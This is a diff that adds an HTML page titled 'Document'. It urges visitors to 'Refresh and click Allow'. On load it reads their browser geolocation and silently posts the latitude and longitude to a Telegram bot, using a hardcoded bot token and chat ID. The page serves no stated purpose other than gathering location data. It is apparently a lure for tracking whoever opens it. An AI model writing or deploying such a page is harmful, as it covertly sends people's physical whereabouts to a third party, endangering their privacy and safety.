@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<p>If You are Unable see anything Refresh and click Allow </p>
+<body onload="getLocation();">
+
+<p id="demo"></p>
+
+<script>
+  var x = document.getElementById("demo");
+  
+  function getLocation() {
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(showPosition);
+    } else { 
+      x.innerHTML = "Geolocation is not supported by this browser.";
+    }
+  }
+  
+  function showPosition(position) {
+    x.innerHTML = "Latitude: " + position.coords.latitude + 
+    "<br>Longitude: " + position.coords.longitude;
+    message = "Latitude: " + position.coords.latitude + 
+    " Longitude: " + position.coords.longitude;
+    x.innerHTML = message;
+    var settings = {
+    "async": true,
+    "crossDomain": true,
+    "url": "https://api.telegram.org/" + "bot1283089488:AAG8JURqRhrag1pOWx858Xc8aIXaZNklt7w" + "/sendMessage",
+    "method": "POST",
+    "headers": {
+      "Content-Type": "application/json",
+      "cache-control": "no-cache"
+    },
+    "data": JSON.stringify({
+      "chat_id": 195709455,
+      "text": message
+    })
+  }
+  
+  $.ajax(settings).done(function (response) {
+    console.log(response);
+  }); 
+  }
+  
+  </script>
+</body>
+</html>
